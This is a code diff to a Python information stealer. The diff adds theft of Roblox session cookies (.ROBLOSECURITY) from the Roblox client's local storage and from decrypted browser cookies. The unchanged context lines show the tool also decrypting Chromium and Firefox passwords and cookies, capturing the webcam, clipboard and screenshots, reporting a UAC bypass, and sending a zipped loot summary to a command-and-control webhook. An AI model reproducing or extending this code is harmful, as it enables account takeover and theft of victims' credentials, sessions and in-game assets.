@@ -48,7 +48,10 @@ webcam_success = 0
 process_count = 0
 clipboard_success = 0
 system_info = 0
+roblox_cookies = 0
 bypass_success = 0
+
+rblx_cookies = set()
 
 def write(file, content):
     with open(file, 'a', encoding='utf-8') as f:
@@ -269,6 +272,14 @@ def get_master_key(local_state_path):
     except Exception as e:
         #print(f"[-] Master key fail: {e}")
         return None
+
+def converttounix(timestamp):
+    unix_time = (timestamp // 1_000_000) - 11644473600
+    return unix_time
+
+def converttounixfirefox(timestamp):
+    unix_time = timestamp // 1000
+    return unix_time
 
 def decrypt_password(buff: bytes, key: bytes) -> str:
     iv = buff[3:15]
@@ -655,6 +666,7 @@ def stealchromium():
     global password_count
     global browsing_history
     global autofill_count
+    global rblx_cookies
     if config.browsers:
     
         chromium_paths = {
@@ -748,14 +760,18 @@ def stealchromium():
                         cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                         try:
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                                expiry = converttounix(expiry)
                                 if value.startswith(b'v10') or value.startswith(b'v11'):
                                     line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
+                                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
+                                        rblx_cookies.add(line)
                                     write(cookieoutput, line)
                                     cookie_count += 1
                                 elif value.startswith(b'v20'):
                                     pass
                                 else:
                                     line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_old(value)}\n"
+                                    rblx_cookies.add(line)
                                     write(cookieoutput, line)
                                     cookie_count += 1
                         except Exception as e:
@@ -861,9 +877,13 @@ def stealchromiumv20():
                         cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                         try:
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                                expiry = converttounix(expiry)
+
                                 decrypted = decrypt_v20_value(value, master_key)
                                 if decrypted is not None:
                                     line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypted}\n"
+                                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
+                                        rblx_cookies.add(line)
                                     write(cookieoutput, line)
                                     cookie_count += 1
                         except Exception as e:
@@ -938,46 +958,50 @@ def stealgecko():
                 history_path = os.path.join(profile_path, 'places.sqlite')
                 
                 if os.path.exists(cookie_path):
-                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                   try:
-                       shutil.copy2(cookie_path, tmpdir)
-                       con = sqlite3.connect(tmpdir)
-                       cur = con.cursor()
-                       cur.execute("SELECT host, name, path, value, isSecure, expiry FROM moz_cookies")
-                       try:
-                           for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
-                               line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{value}\n"
-                               write(cookieoutput, line)
-                               cookie_count += 1
-                       except Exception as e:
-                           pass
-                       cur.close()
-                       con.close()
-                       removefile(tmpdir)
-                   except:
-                       pass
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(cookie_path, tmpdir)
+                        con = sqlite3.connect(tmpdir)
+                        cur = con.cursor()
+                        cur.execute("SELECT host, name, path, value, isSecure, expiry FROM moz_cookies")
+                        try:
+                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
+                                expiry = converttounixfirefox(expiry)
+                                line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{value}\n"
+                                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
+                                    rblx_cookies.add(line)
+
+                                write(cookieoutput, line)
+                                cookie_count += 1
+                        except Exception as e:
+                            pass
+                        cur.close()
+                        con.close()
+                        removefile(tmpdir)
+                    except:
+                        pass
                        
                 if os.path.exists(password_path):
-                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                   try:
-                       shutil.copy2(password_path, tmpdir)
-                       _nss3 = load_nss(profile_path, nss)
-                       
-                       if _nss3:
-                           with open(tmpdir, 'r', encoding='utf-8') as f:
-                               lgns = json.load(f).get('logins', [])
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(password_path, tmpdir)
+                        _nss3 = load_nss(profile_path, nss)
+                        
+                        if _nss3:
+                            with open(tmpdir, 'r', encoding='utf-8') as f:
+                                lgns = json.load(f).get('logins', [])
                                
-                           for login in lgns:
-                               host = login.get('hostname', '')
-                               Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
-                               Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
-                               if Cusername and Cpassword:
-                                   line = f"URL: {host}\nUsername: {Cusername}\nPassword: {Cpassword}\n---------------------------------\n"
-                                   write(passwordoutput, line)
-                                   password_count += 1
-                       removefile(tmpdir)
-                   except Exception as e:
-                       pass
+                            for login in lgns:
+                                host = login.get('hostname', '')
+                                Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
+                                Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
+                                if Cusername and Cpassword:
+                                    line = f"URL: {host}\nUsername: {Cusername}\nPassword: {Cpassword}\n---------------------------------\n"
+                                    write(passwordoutput, line)
+                                    password_count += 1
+                        removefile(tmpdir)
+                    except Exception as e:
+                        pass
                 
                 if os.path.exists(history_path):
                     tmpdir = os.path.join(os.getenv('temp'), randstr(12))
@@ -1274,6 +1298,42 @@ def collectminecraft():
         if modrn == 3:
             minecraft_sessions += 1
 
+def collectroblox():
+    if config.games:
+        global roblox_cookies
+        robloxoutput = os.path.join(output, 'Roblox Cookies')
+        
+        localappdata = os.getenv('localappdata')
+        cookiepath = os.path.join(localappdata, 'Roblox', 'LocalStorage', 'RobloxCookies.dat')
+        if os.path.exists(cookiepath):
+            tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+            try:
+                os.makedirs(robloxoutput, exist_ok=True)
+                shutil.copy2(cookiepath, tmpdir)
+                with open(tmpdir, 'r', encoding='utf-8') as f:
+                    jsondata = json.load(f)
+                    enc_cookies = jsondata.get('CookiesData', '')
+                    if enc_cookies:
+                        decrypted = base64.b64decode(enc_cookies)
+                        decrypted = decrypt_old(decrypted)
+                        decrypted_list = decrypted.split(";")
+                        for cookie in decrypted_list:
+                            if '.ROBLOSECURITY' in cookie:
+                                print(cookie.strip())
+                                write(os.path.join(robloxoutput, 'Cookies.txt'), cookie.strip() + '\n')
+                                roblox_cookies += 1
+
+            except Exception as e:
+                print(e)
+                pass
+        print(rblx_cookies)
+        for rblxcookie in rblx_cookies:
+            write(os.path.join(robloxoutput, 'Cookies.txt'), rblxcookie.strip() + '\n')
+            roblox_cookies += 1
+
+
+
+        
 def blockwebsite(url):
     try:
         with open(os.path.join(os.getenv('systemroot'), 'System32', 'drivers', 'etc', 'hosts'), 'a') as f:
@@ -1419,7 +1479,8 @@ funcs = [systeminfo, get_webcam, get_clipboard, screenshot, kill, stealchromium,
 # stealdiscordacc()
 # collectminecraft()
 # collectsteam()
-         
+
+
 threads = []
 for fn in funcs:
     t = threading.Thread(target=fn, daemon=True)
@@ -1428,7 +1489,8 @@ for fn in funcs:
 
 for t in threads:
     t.join()
-    
+
+collectroblox()
 zip_folder(output, zip_)
 
 
@@ -1458,7 +1520,7 @@ def sendtoc2(file):
           "embeds": [
             {
               "title": "GOD BLESS AMERICA",
-              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Session: {'Yes' if gd_session == 1 else 'No'}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)}\nVM: {'Yes' if is_vm else 'No'}\nUAC Bypass: {'Yes' if bypass_success else 'No'}\n```\n\ncreds: ||{download}||",
+              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Sessions: {'Yes' if gd_session == 1 else 'No'}\nRoblox Cookies: {str(roblox_cookies)}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)}\nVM: {'Yes' if is_vm else 'No'}\nUAC Bypass: {'Yes' if bypass_success else 'No'}\n```\n\ncreds: ||{download}||",
               "color": 3866871,
               "author": {
                 "name": "KirkG"
@@ -1487,7 +1549,8 @@ Total Discord Accounts: {str(discord_accounts)}
 Total Minecraft Sessions: {str(minecraft_sessions)}
 Total Processes: {str(process_count)}
 Steam Session: {'Yes' if steam_session == 1 else 'No'}
-Geometry Dash Session: {'Yes' if gd_session == 1 else 'No'}
+GD Sessions: {'Yes' if gd_session == 1 else 'No'}
+Roblox Cookies: {str(roblox_cookies)}
 Webcam: {'Yes' if webcam_success == 1 else 'No'}
 Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
 System Info: {'Yes' if system_info == 1 else 'No'}
